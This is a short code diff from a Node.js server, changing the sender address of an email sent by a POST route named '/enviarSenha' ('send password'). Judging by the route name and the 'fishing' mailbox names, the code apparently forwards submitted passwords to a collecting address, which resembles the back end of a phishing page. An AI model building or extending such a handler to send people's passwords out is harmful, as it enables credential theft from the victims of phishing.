@@ -20,7 +20,7 @@ server.post('/enviarSenha', async (req, resp) => {
     const opEmail = {
         text:  text,
         subject:  subject,
-        from: 'testeFishing67@hotmail.com <testeFishing67@hotmail.com>',
+        from: 'teste123teste3@outlook.com <teste123teste3@outlook.com>',
         to: ['testefishing69@gmail.com'],
     };
 
